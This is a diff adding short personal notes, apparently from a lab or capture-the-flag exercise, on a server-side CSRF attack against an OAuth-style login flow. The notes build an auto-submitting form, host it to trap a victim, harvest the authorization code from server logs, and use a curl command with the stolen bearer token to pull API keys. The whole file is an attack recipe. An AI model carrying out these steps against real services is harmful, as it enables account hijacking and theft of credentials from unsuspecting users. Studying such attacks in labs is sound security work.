@@ -1,0 +1,13 @@
+# server csrf
+
+create account; sign in; create application
+use provided rb script and add secret &uid from app create
+exec rb script and get url
+inspect and copy auth from
+    add <body onload="document.getElementById('csrf').submit()">
+    behind post add id="csrf">
+    add full ptl url to action
+put page on webserver and point vic there
+check server logs for code
+add code to curl command provided  
+    curl -H 'Authorization: Bearer [TOKEN]' [RESOURCE_SERVER]/api/keys --dump-header -
